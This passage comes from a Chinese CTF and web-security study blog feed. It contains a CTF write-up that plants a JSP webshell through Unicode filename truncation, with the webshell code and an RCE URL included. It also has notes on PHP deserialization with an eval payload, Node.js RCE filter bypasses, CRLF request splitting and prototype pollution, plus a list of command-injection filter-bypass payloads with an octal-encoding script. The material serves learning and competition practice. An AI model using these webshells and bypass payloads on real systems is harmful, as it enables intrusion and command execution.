class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_search</span>(<span class="hljs-params">byte_value</span>):<br>    low_byte = byte_value &amp; <span class="hljs-number">0xFF</span><br>    candidates = []<br>    <span class="hljs-keyword">for</span> high <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span> + <span class="hljs-number">1</span>):<br>        code_point = (high &lt;&lt; <span class="hljs-number">8</span>) | low_byte<br>        <span class="hljs-keyword">try</span>:<br>            char = <span class="hljs-built_in">chr</span>(code_point)<br>            name = unicodedata.name(char)<br>            candidates.append((<span class="hljs-string">f&quot;U+<span class="hljs-subst">&#123;code_point:04X&#125;</span>&quot;</span>, char, name))<br>        <span class="hljs-keyword">except</span> ValueError:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> candidates<br><br>ascii_character = <span class="hljs-string">&quot;j&quot;</span>  <span class="hljs-comment"># 可替换为&quot;s&quot;或&quot;p&quot;</span><br>byte_val = <span class="hljs-built_in">ord</span>(ascii_character)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Possible original characters (<span class="hljs-subst">&#123;byte_val&#125;</span> → 0x<span class="hljs-subst">&#123;byte_val &amp; <span class="hljs-number">0xFF</span>:02X&#125;</span>):&quot;</span>)<br>results = reverse_search(byte_val)<br><span class="hljs-keyword">for</span> cp, char, name <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;cp&#125;</span>: <span class="hljs-subst">&#123;char&#125;</span> - <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure></li></ul></li></ol><ul><li><p>脚本会列出所有低字节为<code>0x6A</code>的 Unicode 字符，如<code>U+006A</code>（’j’ 本身）、<code>U+016A</code>（’Ǫ’）、<code>U+026A</code>（’ɪ’）等，其中部分字符可能绕过上传校验。</p><p>  <strong>上传与利用备份功能</strong>：</p><ul><li><p>将构造的文件上传至系统（可能通过文件上传接口或其他方式）</p></li><li><p>利用备份功能触发 jtar 打包，文件名中的 Unicode 字符被截断为<code>.jsp</code></p></li><li><p>恢复备份时，文件被写入 JSP 解析目录</p><p>  最后访问rce</p><p>  110.42.47.146:7777&#x2F;view?page&#x3D;712ea348-98fd-497f-ab94-3af428f9e052&amp;cmd&#x3D;cat &#x2F;flag</p></li></ul></li></ul><p><img src="/%E5%9B%BE%E7%89%87/9d51446618ba51c76ec67d8d48022af.png" alt="9d51446618ba51c76ec67d8d48022af"></p><p>jsp格式的木马</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; <br>&lt;% <br><span class="hljs-title class_">String</span> cmd = <span class="hljs-string">&quot;printenv&quot;</span>; <br><span class="hljs-title class_">String</span> output = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">try</span> &#123; <br> <br> <br>        <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd); <br>        <span class="hljs-title class_">BufferedReader</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">InputStreamReader</span>(p.<span class="hljs-title function_">getInputStream</span>())); <br>        <span class="hljs-title class_">String</span> line; <br>        <span class="hljs-keyword">while</span> ((line = reader.<span class="hljs-title function_">readLine</span>()) != <span class="hljs-literal">null</span>) &#123; <br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <br>        &#125; <br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123; <br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(); <br>    &#125; <br>%&gt; <br> <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Command Output<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Executed Command: <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>&lt;%= cmd %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&lt;%= output %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>cmd实现命令执行</p><h2 id="4-D3-tidy-quic"><a href="#4-D3-tidy-quic" class="headerlink" title="4.D3 tidy quic"></a>4.D3 tidy quic</h2><h3 id="该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）"><a href="#该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）" class="headerlink" title="该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）"></a>该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）</h3><h3 id="一、攻击背景：HTTP-3-缓冲区污染漏洞"><a href="#一、攻击背景：HTTP-3-缓冲区污染漏洞" class="headerlink" title="一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞"></a><strong>一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞</strong></h3><p>HTTP&#x2F;3 基于 QUIC 协议，服务器在处理请求时可能<strong>重复使用同一块内存缓冲区</strong>（Buffer Pool）来存储不同请求的数据。若两次请求的 <code>Content-Length</code>（内容长度）相同，服务器会分配同一块固定大小的缓冲区。此时：</p><ul><li><strong>第一次请求</strong>：在缓冲区中写入数据（如包含 <code>&quot;flag&quot;</code> 的字符串）。</li><li><strong>第二次请求</strong>：覆盖缓冲区的前半部分，与第一次残留的 <code>&quot;flag&quot;</code> 拼接成特定字符串（如 <code>&quot;I want flag&quot;</code>），触发服务器的敏感逻辑（如返回 flag）。</li></ul><h3 id="二、脚本核心思路拆解"><a href="#二、脚本核心思路拆解" class="headerlink" title="二、脚本核心思路拆解"></a><strong>二、脚本核心思路拆解</strong></h3><p>该脚本通过两次 HTTP&#x2F;3 POST 请求，利用缓冲区重用机制，拼接出服务器预期的字符串，最终获取 flag。以下是关键步骤的详细解释：</p><p><img src="/%E5%9B%BE%E7%89%87/image-20250608151105334.png" alt="image-20250608151105334"></p><p><img src="/%E5%9B%BE%E7%89%87/image-20250608151144852.png" alt="image-20250608151144852"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a><strong>php反序列化漏洞</strong></h1><h2 id="一、php面向对象基础"><a href="#一、php面向对象基础" class="headerlink" title="一、php面向对象基础"></a>一、php面向对象基础</h2><p>1.面向过程<br>        面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数；</p><p>2.面向对象<br>        面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象；</p><p>对象的三个特征：对象的行为，对象的形态，对象的表示</p><p>3.类的定义<br>        类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起；对象是具有类类型的变量，是对类的实例；</p><pre><code class="hljs">    类的定义包括定义类名、定义成员属性、定义成员方法；</code></pre><p>内部构成：成员属性(变量)+成员方法(函数)</p><p>4.继承<br>        继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系；</p><pre><code class="hljs">    在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容；</code></pre><p>父类：一个类被其它类继承，可将该类成为父类，或基类，超类；</p><p>子类：一个类继承其他类称为子类，也可称为派生类；</p><p>5.类的访问权限修饰符<br>public：公共的，在类的内部、子类和类的外部中都可以被调用；</p><p>protected：受保护的，在类的内部和子类可以被调用，在类的外部不可调用；</p><p>private：私有的，只能在类的内部调用，在子类和类的外部不可调用；</p><h2 id="二、序列化基础"><a href="#二、序列化基础" class="headerlink" title="二、序列化基础"></a>二、序列化基础</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        序列化是将对象或数组转化为方便存储、传输的字符串，php使用serialize()函数将对象序列化；</p><pre><code class="hljs">    序列化只作用于对象的成员属性，不序列化成员方法；</code></pre><h3 id="2-序列化值"><a href="#2-序列化值" class="headerlink" title="2.序列化值"></a>2.序列化值</h3><p>各类型值的serialize序列化：</p><p>空字符              null                -&gt;            N;</p><p>整型                   123            -&gt;         i:123;</p><p>浮点型                1.5             -&gt;         d:1.5;</p><p>boolean型          true            -&gt;         b:1;</p><p>boolean型          false            -&gt;         b:0;</p><p>字符串               “haha”           -&gt;        s:4:”haha”;</p><p>3.对象序列化<br>&#x2F;&#x2F;对象序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test<br>&#123;<br>    private $a1=&quot;haha&quot;;<br>    protected $a2=&quot;dada&quot;;<br>    public $a3=&quot;sasa&quot;;<br>    public $b=true;<br>    public  $c=123;<br>&#125;<br>$d=new test();<br>echo serialize($d);<br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出为：<br>O:4:”test”:5:{s:8:” test a1”;s:4:”haha”;s:5:” * a2”;s:4:”dada”;s:2:”a3”;s:4:”sasa”;s:1:”b”;b:1;s:1:”c”;i:123;}</p><p>&#x2F;&#x2F;解释：大写字母O表示对象，4是类名长度，test为类名，5表示该类有5个成<br>&#x2F;&#x2F;员属性，注意private私有属性序列化的属性名格式为“%00类名%00属性名”，<br>&#x2F;&#x2F;%00为空格，如上的“ test a1”，protected受保护属性序列化的属性名格<br>&#x2F;&#x2F;式为“%00*%00属性名”，如上的“ * a2”，对于存在这两种类型的成员属性的<br>&#x2F;&#x2F;类在写payload时通常会使用urlencode()函数编码；其他都是正常的序列化</p><p>Public(公有):被序列化时属性值为：属性名<br>Protected(受保护):被序列化时属性值为：\x00*\x00属性名<br>Private(私有):被序列化时属性值为：\x00类名\x00属性名<br> 4.pop链序列化<br>&#x2F;&#x2F;pop链序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test1<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public $b=true;<br>    public $c=123;<br>&#125;<br>class test2<br>&#123;<br>    public $h=&quot;hhh&quot;;<br>    public $d;<br>&#125;<br><br>$m=new test1();<br>$n=new test2();<br>$n-&gt;d=$m;<br>echo serialize($n);<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出：<br>O:5:”test2”:2:{s:1:”h”;s:3:”hhh”;s:1:”d”;O:5:”test1”:3:{s:1:”a”;s:4:”haha”;s:1:”b”;b:1;s:1:”c”;i:123;}}<br>&#x2F;&#x2F;对象的成员属性为另一个对象，序列化值出现如上嵌套<br> 5.数组序列化<br>&#x2F;&#x2F;数组序列化<br><?php$ha=array("haha",123,true,"ggg");echo serialize($ha);?><br>&#x2F;&#x2F;输出：<br>a:4:{i:0;s:4:”haha”;i:1;i:123;i:2;b:1;i:3;s:3:”ggg”;}</p><p>&#x2F;&#x2F;解释：a表示这是一个数组的序列化，成员属性名为数组的下标，格式”i:数组下标;”<br>&#x2F;&#x2F;其他与正常序列化一致</p><h2 id="三、反序列化"><a href="#三、反序列化" class="headerlink" title="三、反序列化"></a>三、反序列化</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        反序列化是将序列化得到的字符串转化为一个对象的过程；</p><pre><code class="hljs">    反序列化生成的对象的成员属性值由被反序列化的字符串决定，与原来类预定义的值无关；    反序列化使用unserialize()函数将字符串转换为对象，序列化使用serialize()函数将对象转化为字符串；</code></pre><p>&#x2F;&#x2F;反序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public $b=123;<br>&#125;<br><br>$ha=&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;666&quot;;s:1:&quot;b&quot;;i:6666;&#125;&#x27;;<br>$ha=unserialize($ha)<br>var_dump($ha);<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出：<br>object(test)#1 (2) {<br>  [“a”]&#x3D;&gt;  string(3) “666”<br>  [“b”]&#x3D;&gt;  int(6666)<br>}</p><p>&#x2F;&#x2F;如上将字符串转换为对象，且对象的值与类预定义的值无关，取决于被反序列化的字符串<br>2.反序列化漏洞的成因<br>        反序列化过程中unserialize()函数的参数可以控制，传入特殊的序列化后的字符串可改变对象的属性值，并触发特定函数执行代码；</p><p>&#x2F;&#x2F;反序列化漏洞简单案例</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text"><br>&lt;?php<br>class test<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public function display()<br>    &#123;<br>        eval($this-&gt;a);<br>    &#125;<br>&#125;<br> $cmd=$_GET[&#x27;cmd&#x27;];<br>//cmd=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;<br>$d=unserialize($cmd);<br>$d-&gt;display();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;如上反序列化的内容是GET方法获得的，是可控的，传入上图注释中的cmd<br>&#x2F;&#x2F;内容，可实现执行php代码：phpinfo();<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/m0_73185293/article/details/131353031">https://blog.csdn.net/m0_73185293/article/details/131353031</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html的学习</title>
    <link href="/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="html的学习"><a href="#html的学习" class="headerlink" title="html的学习"></a>html的学习</h1><h2 id="1-基本标签"><a href="#1-基本标签" class="headerlink" title="1.基本标签"></a>1.基本标签</h2><pre><code class="hljs">&lt;meta nane=&quot;keywords&quot; content=&quot;html学习,编程&quot; /&gt;&lt;meta name=&quot;description&quot; content=&quot;这是一个关于html的学习&quot;&gt;&lt;meta name=&quot;author&quot;    content=&quot;fearless123&quot;&gt;</code></pre><p>不会显示，给搜索引擎看的</p><pre><code class="hljs">&lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;2&lt;/h2&gt;&lt;h3&gt;3&lt;/h3&gt;&lt;h4&gt;4&lt;/h4&gt;</code></pre><p>标题1到4，逐渐变小</p> <p>这是一个段落<br>br换到下一行<hr>换行线标签，比br多一个分割线</p><p>br换行，hr用线隔开换行</p> <!--strong,b是加粗，i是斜体，u是下划线，sup是上标,sub是下标,del是删除线,font调整字体属性:font size大小，color颜色,pre按代码的格式输出--><h2 id="2-表单form"><a href="#2-表单form" class="headerlink" title="2.表单form"></a>2.表单form</h2><h2 id="1-1-form表单"><a href="#1-1-form表单" class="headerlink" title="1.1.  form表单"></a>1.1.  form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码。</p><p>enctype 属性可能的值</p><p>​       application&#x2F;x-www-form-urlencoded    multipart&#x2F;form-data    text&#x2F;plain</p><p>input标签</p><p>name：同样是表示的该文本输入框名称。   size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。  value：输入框中的默认值   readonly：表示该框中只能显示，不能添加修改。</p><p>input的类型</p><p>type&#x3D;password 密码输入框   type&#x3D;file 文件上传    type&#x3D;hidden 隐藏域   button 按钮</p><p>checkbox 复选框   radio 单选框   type&#x3D;submit 提交按钮      type&#x3D;reset  重置按钮</p><p>  <label>第二节课:表单</label> </p>  <form action="" method="post" >         <label>用户名</label><input type="text" name="username" size="30" maxlength="12" value="admin" readonly><br>         <label>密&nbsp;码</label><input type="password" name="password" size="30"  maxlength="12"><br>         <label for="email">邮&nbsp;箱</label><input type="text" name="emali" id="email" ><br> <!--加上id和for，点击汉字即可跳转到输入框-->         <label>掌握技能:<br></label> <label>安全开发</label><input type="checkbox"> <br>         <label>渗透测试</label><input type="checkbox"><br>         <label>性&nbsp;别</label> <label>男<input type="radio" value="1" name="sex">女<input type="radio" value="2" name="sex"></label>         <input type="hidden" value="1"> <br>         <input type="submit" value="提交"> <input type="button" size="40" value="111">         <input type="reset" value="重置"></form>  <br><br><form action="" method="post" enctype="multipart/form-data">​    <label>文件上传</label><input type="file" name="file"><br>​    <input type="submit"></form>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node js</title>
    <link href="/2025/06/11/nodejs/"/>
    <url>/2025/06/11/nodejs/</url>
    
    <content type="html"><![CDATA[<h1 id="node-js"><a href="#node-js" class="headerlink" title="node js"></a>node js</h1><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a><strong>md5</strong></h2><p><img src="D:\ctf\笔记\图片\c079ac4aacca550c951c607d6a5e55e.png"></p><p>在示例中：</p><p>a &#x3D; {x: 1} 和 b &#x3D; {x: 2} 定义了两个不同的对象。<br>当执行 console.log(a + “test”) &#x2F;&#x2F;打印时，JavaScript 会先将对象 a 转换为字符串。由于没有为 a 定义自定义的 toString() 方法，所以会调用默认的 Object.prototype.toString() 方法，将 a 转换为 “[object Object]”，然后再与 “test” 进行字符串拼接，结果就是 “[object Object]test” 。<br>同理，对于 console.log(b + “test”) ，对象 b 也会调用默认的 Object.prototype.toString() 方法被转换为 “[object Object]”，然后与 “test” 拼接得到 “[object Object]test” 。</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img src="D:\ctf\笔记\图片\027683ea7b4c32aa6639a4713eadf4c.png"></p><p><img src="D:\ctf\笔记\图片\c67e977f054a9779857ba5d93e45ba4.png"></p><p>readFile和wrteFileSync是两个参数</p><h2 id="rce-bypass"><a href="#rce-bypass" class="headerlink" title="rce bypass"></a>rce bypass</h2><h3 id="1-字符拼接"><a href="#1-字符拼接" class="headerlink" title="1.字符拼接"></a>1.字符拼接</h3><p><img src="D:\ctf\笔记\图片\c5c46c4a94d987487d418d4438b3a08.png"></p><p>exec,execSync,eval可以执行命令</p><p>%2b是+，以及.concat()可以进行拼接字符bypass</p><h3 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h3><p><img src="D:\ctf\笔记\图片\53eb90135804ed9cb309eaced5f6f5e.png"></p><p>\x十六进制编码,\u Unicode编码,以及base64编码</p><h3 id="3-模板拼接"><a href="#3-模板拼接" class="headerlink" title="3.模板拼接"></a>3.模板拼接</h3><p><img src="D:\ctf\笔记\图片\1748256757800.jpg"></p><p>${‘ ‘}模板拼接</p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><h4 id="原理详解："><a href="#原理详解：" class="headerlink" title="原理详解："></a>原理详解：</h4><ol><li><strong>编码转换与截断问题</strong><ul><li><strong>Unicode 到字节的转换</strong>：JavaScript 支持 Unicode 字符串（如 <code>\u&#123;010D&#125;</code>、<code>\u&#123;010A&#125;</code>），但 Node.js 在处理无请求主体（如 GET、DELETE）的 HTTP 请求时，默认使用 <strong>latin1 编码</strong>将路径字符串转换为原始字节。</li><li><strong>latin1 编码的限制</strong>：latin1 是单字节编码（仅支持 0-255 的字符），对于高编号 Unicode 字符（如 <code>\u&#123;010D&#125;</code>，十进制值为 269，超出 latin1 范围），Node.js 会 <strong>截断其最低字节</strong>（如 <code>\u&#123;010D&#125;</code> 截断为 <code>0x0D</code>，即 <code>\r</code>；<code>\u&#123;010A&#125;</code> 截断为 <code>0x0A</code>，即 <code>\n</code>）。</li></ul></li><li><strong>HTTP 协议控制字符的注入</strong><ul><li><strong>利用截断结果</strong>：<code>\r</code> 和 <code>\n</code> 是 HTTP 协议中的 <strong>控制字符</strong>（用于分隔请求行、请求头、请求体）。攻击者在请求路径中嵌入精心构造的 Unicode 字符（如 <code>\u&#123;010D&#125;\u&#123;010A&#125;</code>），Node.js 处理时会将其转换为 <code>\r\n</code>，<strong>注入到 HTTP 请求的原始字节流中</strong>。</li><li><strong>请求拆分攻击</strong>：通过注入 <code>\r\n</code>，攻击者可篡改请求结构，将原本的单一请求拆分为多个伪造的请求（如在路径中插入新的请求头或请求体），欺骗服务器发起 <strong>未授权的内部请求</strong>（即 SSRF 攻击）。</li></ul></li><li><strong>漏洞触发条件</strong><ul><li><strong>Node.js 版本</strong>：8 或更低版本（Node.js 10 及以上已修复，对非 ASCII 字符直接报错）。</li><li>请求特征：<ul><li>接受用户输入的 <strong>Unicode 数据</strong> 并包含在请求路径中。</li><li>请求 <strong>无主体</strong>（如 GET、DELETE，此时默认使用 latin1 编码）。</li></ul></li></ul></li></ol><p><img src="D:\ctf\笔记\图片\1748257803135.jpg"></p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p><img src="D:\ctf\笔记\图片\image-20250526194358035.png" alt="image-20250526194358035"></p><p>proto是object的一个私有属性，prototype是原型对象，null没有原型</p><p>实例**._<em>prototype</em>*_指向它的构造函数的原型对象</p><p><img src="D:\ctf\笔记\图片\image-20250526195607344.png" alt="image-20250526195607344"></p><p>Son.prototype&#x3D;son.<strong>proto</strong></p><p><img src="D:\ctf\笔记\图片\image-20250526202746124.png" alt="image-20250526202746124"></p><p>通过proto来改变原型的属性</p><p><img src="D:\ctf\笔记\图片\image-20250526203707315.png" alt="image-20250526203707315"></p><p>json解析使proto被当作是键名</p><p><img src="D:\ctf\笔记\图片\image-20250526205234353.png" alt="image-20250526205234353"></p><p>利用proto控制基类的成员，造成代码注入从而rce</p><p><img src="D:\ctf\笔记\图片\image-20250526205407303.png" alt="image-20250526205407303"></p><h3 id="通俗解释"><a href="#通俗解释" class="headerlink" title="通俗解释:"></a>通俗解释:</h3><ul><li>普通对象（如 {} 或 new Object () ）没有 prototype 属性，只有 <strong>proto</strong> ，指向它的原型。</li><li>函数对象（如 Object、Array、Function 等）既有 <strong>proto</strong> ，也有 prototype 。prototype 是函数对象的 “模板”，所有通过该函数创建的对象都会继承这个模板。</li></ul><p>obj–&gt;Object.prototype–&gt;null</p><p>重要概念： 1. <code>obj.__proto__</code> 是直接访问对象原型的方式 </p><p>​                     2.<code>obj.constructor.prototype</code> 是间接访问对象原型的方式 </p><p>​                     3.这两种路径都能用来修改原型，从而影响所有对象 </p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rce进阶</title>
    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2025/06/11/xss%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/xss%E6%BC%8F%E6%B4%9E/</url>
    
